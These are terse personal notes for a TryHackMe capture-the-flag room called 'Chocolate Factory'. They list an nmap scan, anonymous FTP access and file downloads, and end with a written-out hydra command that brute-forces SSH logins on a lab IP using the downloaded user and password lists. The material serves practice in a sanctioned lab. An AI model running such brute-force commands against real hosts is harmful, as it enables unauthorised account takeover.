Rough Notes - Chocolate Factory - TryHackMe CTF

nmap --> ftp, ssh

ftp -- anonymous

login

ls doesnt work

google workaround

quote PASV

ls

get locks

get users

hydra --> ssh brute force with usernames and passwords from ftp files

hydra -L users.txt -P locks.txt 10.10.198.21 ssh